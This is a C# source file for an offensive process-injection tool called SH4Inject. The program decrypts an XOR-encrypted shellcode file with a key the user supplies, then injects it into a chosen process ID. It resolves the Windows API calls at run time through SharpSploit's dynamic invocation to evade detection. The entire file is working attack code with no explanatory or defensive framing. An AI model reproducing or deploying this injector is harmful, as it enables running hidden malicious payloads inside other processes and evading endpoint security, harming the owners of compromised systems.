using System;
using System.IO;
using System.Runtime.InteropServices;
using SharpSploit.Execution.DynamicInvoke;

namespace SH4Inject
{
    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        public static byte[] XOR(byte[] payload, string key)
        {
            byte[] xor_string = new byte[payload.Length];
            char[] xor_key = key.ToCharArray();
            for (int i = 0; i < payload.Length; i++)
            {
                xor_string[i] = (byte)(payload[i] ^ xor_key[i % xor_key.Length]);
            }
            return xor_string;
        }

        static void Main(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                Console.WriteLine("Example: SH4Inject.exe <path to XOR'ed payload> <PID to inject>");
            }
            else { 
                Console.WriteLine("The secret key: ");
                String key = Console.ReadLine();
                byte[] payload = File.ReadAllBytes(args[0]);
                byte[] decrypted_payload = XOR(payload, key);

                var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
                var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;
                var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[1]));

                pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
                var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VirtualAllocEx)) as VirtualAllocEx;
                var alloc = virtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_payload.Length, 0x1000 | 0x2000, 0x40);

                pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
                var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(WriteProcessMemory)) as WriteProcessMemory;
                writeProcessMemory(hProcess, alloc, decrypted_payload, (uint)decrypted_payload.Length, out UIntPtr bytesWritten);

                // DEBUGGING
                Console.WriteLine("Press a key to proceed.");
                Console.ReadLine();

                pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
                var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateRemoteThread)) as CreateRemoteThread;
                createRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);


                // DEBUGGING
                Console.WriteLine("Press a key to close.");
                Console.ReadLine();
            }
        }
    }
}
